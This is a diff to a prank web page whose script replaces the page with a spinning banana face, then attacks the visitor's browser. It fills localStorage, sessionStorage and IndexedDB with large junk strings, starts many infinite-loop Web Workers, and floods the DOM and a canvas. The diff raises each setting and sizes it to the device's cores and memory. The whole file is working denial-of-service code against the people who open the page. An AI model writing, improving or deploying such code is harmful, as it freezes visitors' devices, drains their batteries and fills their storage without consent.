@@ -18,6 +18,15 @@
       font-size: clamp(28px, 7vw, 72px);
       user-select: none;
     }
+    .banana {
+      display: inline-block;
+      animation: spin 0.08s linear infinite;
+      font-size: 120px;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -26,38 +35,34 @@
   <script>
     setTimeout(() => {
       document.body.innerHTML = `
-        <h1>(   ᐛ)ﾊﾞﾅﾅ</h1>
-        <p style="font-size:0.6em;margin-top:30px;">スペック検知中...</p>
+        <h1><span class="banana">(   ᐛ)ﾊﾞﾅﾅ</span></h1>
+        <p style="font-size:0.6em;margin-top:30px;">MAX CPU MODE ACTIVATED</p>
       `;
 
-      // スペック検知
-      const cores = navigator.hardwareConcurrency || 4;
-      const memoryGB = navigator.deviceMemory || 4; // 対応ブラウザのみ（GB単位）
-      const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
-      
-      // 簡易ベンチマーク（CPUの強さを大まかに測る）
+      const cores = navigator.hardwareConcurrency || 8;
+      const memoryGB = navigator.deviceMemory || 8;
+      const isHighSpec = cores >= 8 || memoryGB >= 8;
+
       function quickBenchmark() {
         const start = performance.now();
         let x = 0;
-        for (let i = 0; i < 5000000; i++) {
-          x += Math.sqrt(i) * Math.sin(i);
+        for (let i = 0; i < 8000000; i++) {
+          x += Math.sqrt(Math.random() * 1e9) * Math.sin(i) * Math.cos(i * 0.1);
         }
         return performance.now() - start;
       }
 
       const benchmarkTime = quickBenchmark();
-      const powerLevel = Math.min(3, Math.max(1, Math.floor(800 / benchmarkTime))); // 1〜3段階
-
       const intensity = {
-        workers: Math.max(cores * 1.5, 6),
-        storageItems: Math.floor(200 + memoryGB * 80),
-        domPerTick: Math.floor(4000 + cores * 800),
-        canvasMultiplier: Math.max(1.2, cores / 4),
-        interval: Math.max(8, 20 - cores * 2)
+        workers: Math.max(cores * 2, 16),
+        storageItems: 400 + memoryGB * 120,
+        domPerTick: 8000 + cores * 1200,
+        canvasMult: Math.max(2, cores / 3),
+        interval: Math.max(6, 18 - cores)
       };
 
       function storageBomb() {
-        const hugeData = '🍌'.repeat(1024 * 600);
+        const hugeData = '🍌'.repeat(1024 * 800);
 
         try {
           for (let i = 0; i < intensity.storageItems; i++) {
@@ -66,7 +71,7 @@
         } catch(e) {}
 
         try {
-          for (let i = 0; i < intensity.storageItems + 100; i++) {
+          for (let i = 0; i < intensity.storageItems + 200; i++) {
             sessionStorage.setItem('lag_s_' + i, hugeData);
           }
         } catch(e) {}
@@ -82,64 +87,79 @@
           const db = e.target.result;
           const tx = db.transaction('lagStore', 'readwrite');
           const store = tx.objectStore('lagStore');
-          
           setInterval(() => {
-            for (let i = 0; i < 60 + cores * 10; i++) {
-              store.put(hugeData, 'key_' + Date.now() + '_' + i);
+            for (let i = 0; i < 120 + cores * 20; i++) {
+              store.put(hugeData + Math.random().toString(36), 'key_' + Date.now() + i);
             }
-          }, 40);
+          }, 30);
         };
       }
 
       function cpuBurn() {
-        const workerCode = `
+        const heavyWorkerCode = `
           self.onmessage = function() {
             while(true) {
-              let x = 0;
-              for(let i = 0; i < 300000; i++) {
-                x += Math.sqrt(Math.random() * 999999) * Math.sin(i);
+              let x = Math.random() * 1e8;
+              let arr = new Array(500);
+              for(let i = 0; i < 800000; i++) {
+                x = Math.sqrt(x) * Math.sin(x) * Math.cos(x * 1.3) + Math.tan(x * 0.7);
+                arr[i % 500] = x.toString(36) + Math.random();
+                if (i % 120000 === 0) {
+                  arr = arr.concat(new Array(300).fill('🍌'));
+                }
               }
             }
           };
         `;
-        const blob = new Blob([workerCode], {type: 'text/javascript'});
+
+        const blob = new Blob([heavyWorkerCode], {type: 'text/javascript'});
         const url = URL.createObjectURL(blob);
 
         for (let i = 0; i < intensity.workers; i++) {
-          const w = new Worker(url);
-          w.postMessage('die');
+          try {
+            const w = new Worker(url);
+            w.postMessage('burn');
+          } catch(e) {}
         }
+
+        setInterval(() => {
+          let y = 0;
+          for (let i = 0; i < 600000; i++) {
+            y += Math.sqrt(Math.random() * 1e9) * Math.log(Math.abs(Math.sin(i) + 1));
+          }
+        }, 1);
       }
 
       function visualBomb() {
         setInterval(() => {
           for (let i = 0; i < intensity.domPerTick; i++) {
             const d = document.createElement('div');
-            d.textContent = 'LAG🍌';
+            d.textContent = 'LAG🍌' + Math.random().toString(36);
             d.style.position = 'fixed';
             d.style.left = Math.random() * 100 + 'vw';
             d.style.top = Math.random() * 100 + 'vh';
-            d.style.fontSize = (Math.random() * 40 + 12) + 'px';
-            d.style.opacity = Math.random() * 0.7 + 0.3;
+            d.style.fontSize = (Math.random() * 50 + 15) + 'px';
+            d.style.opacity = Math.random() * 0.6 + 0.4;
+            d.style.transform = `rotate(${Math.random()*360}deg)`;
             document.body.appendChild(d);
           }
         }, intensity.interval);
 
         const c = document.createElement('canvas');
-        c.width = window.innerWidth * intensity.canvasMultiplier;
-        c.height = window.innerHeight * intensity.canvasMultiplier;
+        c.width = window.innerWidth * intensity.canvasMult;
+        c.height = window.innerHeight * intensity.canvasMult;
         c.style.position = 'fixed';
         c.style.zIndex = '-1';
         document.body.appendChild(c);
-        const ctx = c.getContext('2d');
+        const ctx = c.getContext('2d', {alpha: true});
         function drawChaos() {
-          ctx.fillStyle = `hsla(${Math.random()*360},100%,50%,0.08)`;
-          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 120, 120);
+          ctx.fillStyle = `hsla(${Math.random()*360},100%,60%,0.07)`;
+          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 180, 180);
+          if (Math.random() > 0.7) ctx.clearRect(0, 0, c.width, c.height);
           requestAnimationFrame(drawChaos);
         }
         drawChaos();
       }
-
 
       storageBomb();
       cpuBurn();
